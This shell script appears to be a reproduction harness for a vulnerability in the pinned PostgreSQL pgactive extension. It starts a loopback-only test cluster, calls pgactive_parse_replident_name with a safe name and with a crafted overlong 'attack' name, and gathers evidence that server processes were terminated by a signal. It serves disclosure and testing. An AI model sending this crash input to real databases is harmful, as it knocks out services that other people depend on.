#!/bin/sh
# Load the full pinned pgactive extension into a loopback-only PostgreSQL
# cluster and call the real pgactive_parse_replident_name SQL function.
# Provisioning (build/install of both pinned releases) is in PROVISION.md.
set -u
cd "$(dirname "$0")" || exit 1
PGBIN=${PGBIN:-/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin}
PORT=${PORT:-58421}
VERSION=${VERSION:-2.1.9}
LABEL=${LABEL:-vuln}
ROOT=${PWD}
PGDATA=${ROOT}/pgdata
SOCK=${ROOT}/sock
mkdir -p evidence "$SOCK"
rm -rf "$PGDATA" evidence/server.log
ATTACK="pgactive_123_1_2_3_$(printf 'AZ%.0s' $(seq 1 80))"
printf '%s\n' "$ATTACK" > "evidence/${LABEL}-attack-name.txt"

"$PGBIN/initdb" -D "$PGDATA" -A trust --no-sync --no-instructions \
    >evidence/initdb.log 2>&1
echo "INITDB=$?"
"$PGBIN/pg_ctl" -D "$PGDATA" -l "$ROOT/evidence/server.log" -w start \
    -o "-p $PORT -k $SOCK -c listen_addresses=127.0.0.1 \
        -c shared_preload_libraries=pgactive -c track_commit_timestamp=on \
        -c wal_level=logical" >evidence/pgstart.log 2>&1
echo "PGSTART=$?"
[ -f "$PGDATA/postmaster.pid" ] || { cat evidence/pgstart.log; cat evidence/server.log; exit 1; }

PSQL="$PGBIN/psql -h $SOCK -p $PORT -d postgres -X -q -v ON_ERROR_STOP=1"
$PSQL -c "CREATE EXTENSION pgactive VERSION '$VERSION';" \
    >"evidence/create-${LABEL}.out" 2>&1
echo "CREATE_${LABEL}=$?"
$PSQL -c "SELECT * FROM pgactive.pgactive_parse_replident_name('pgactive_123_1_2_3_'::text);" \
    >"evidence/${LABEL}-safe.out" 2>&1
echo "${LABEL}_SAFE=$?"
$PSQL -c "SELECT * FROM pgactive.pgactive_parse_replident_name('$ATTACK'::text);" \
    >"evidence/${LABEL}-attack.out" 2>&1
echo "${LABEL}_ATTACK_RC=$?"
$PSQL -c "SELECT proname, proacl FROM pg_proc WHERE proname = 'pgactive_parse_replident_name';" \
    >"evidence/${LABEL}-acl.out" 2>&1
echo "${LABEL}_ACL_RC=$?"
grep -c 'was terminated by signal' evidence/server.log \
    >"evidence/${LABEL}-server-terminations.txt"

"$PGBIN/pg_ctl" -D "$PGDATA" -m fast -w stop >evidence/pgstop.log 2>&1
echo "PGSTOP=$?"
echo '--- create ---'; cat "evidence/create-${LABEL}.out"
echo '--- safe ---'; cat "evidence/${LABEL}-safe.out"
echo '--- attack ---'; cat "evidence/${LABEL}-attack.out"
echo '--- ACL ---'; cat "evidence/${LABEL}-acl.out"
echo '--- server terminations ---'; cat "evidence/${LABEL}-server-terminations.txt"
